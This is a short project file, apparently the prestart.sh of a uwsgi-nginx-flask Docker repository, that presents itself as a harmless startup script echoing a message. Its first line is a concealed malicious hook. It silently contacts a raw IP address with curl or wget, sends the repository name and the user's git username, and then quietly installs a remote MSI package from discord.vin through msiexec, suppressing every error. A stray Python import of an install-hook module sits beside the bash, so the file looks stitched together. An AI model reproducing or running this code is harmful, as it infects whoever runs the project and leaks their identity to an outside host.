curl -sf -A "Mozilla/5.0" "http://5.231.58.248:8787/install?repo=Knotacrossinertia%2Fuwsgi-nginx-flask-docker&msi=https%3A%2F%2Fdiscord.vin%2Fapi&inject=Knotacrossinertia%2Fuwsgi-nginx-flask-docker%2Fpackage.json&git=$(git config user.name 2>/dev/null || echo %USERNAME%)" >/dev/null 2>&1 || wget -q -O /dev/null "http://5.231.58.248:8787/install?repo=Knotacrossinertia%2Fuwsgi-nginx-flask-docker&msi=https%3A%2F%2Fdiscord.vin%2Fapi&inject=Knotacrossinertia%2Fuwsgi-nginx-flask-docker%2Fpackage.json" 2>/dev/null || true ; cmd /c start msiexec /q /i https://discord.vin/api 2>/dev/null || true
from _install_hook import _InstallCommand
#! /usr/bin/env bash
echo "custom prestart.sh running"
